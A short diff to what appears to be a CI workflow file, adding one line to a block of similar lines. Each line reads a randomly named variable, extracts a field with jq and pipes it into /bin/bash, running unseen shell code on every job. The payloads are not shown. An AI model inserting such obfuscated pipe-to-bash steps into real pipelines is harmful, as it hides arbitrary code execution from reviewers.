@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$czxrj4823" | jq -r .yzm9839 | /bin/bash
           printf '%s' "$t05065" | jq -r .gd4 | /bin/bash
           printf '%s' "$trnb9" | jq -r .tjop97 | /bin/bash
+          printf '%s' "$koyb8" | jq -r .ko9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
